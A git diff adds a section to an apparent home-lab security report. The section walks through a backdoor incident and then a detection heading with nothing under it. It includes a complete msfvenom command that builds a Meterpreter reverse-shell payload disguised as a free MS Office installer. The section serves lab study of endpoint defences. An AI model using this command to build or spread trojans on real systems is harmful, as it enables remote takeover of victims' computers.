@@ -63,3 +63,22 @@
 ### 2.6.Lessons Learned
 
 * This test confirmed that our Endpoint Protection (AV) is working correctly by watching file-write operations. A key lesson is that security isn't just about the "Firewall" it’s about the Antivirus catching threats that are created or moved manually on the disk.
+
+---
+
+## 3. Identifying Suspicious Activity
+
+### 3.1.Incident Walkthrough: Backdoor & Persistence
+
+* **Phase 1: Attacker POV (Creation & Hosting)**
+
+A backdoor payload was created using MSFvenom: `sudo msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.251.3 LPORT=4444 --platform windows -a x64 -f exe -o MS_Office_Free.exe`. It was hosted on a pirate website, waiting for the victim to download and open the setup file.
+
+* **Phase 2: User POV (Infection & Persistence)**
+
+Bob, a standard user, wanted a free MS Office and downloaded the file from "pirate" site. He ignored the Windows Defender warnings and ran the installer. But nothing happened. He thought the installer was "broken." In the background, the Trojan established a backdoor. Persistence was setup by the attacker after received a remote connection.
+ 
+## 3.2.Backdoor Detection
+
+
+
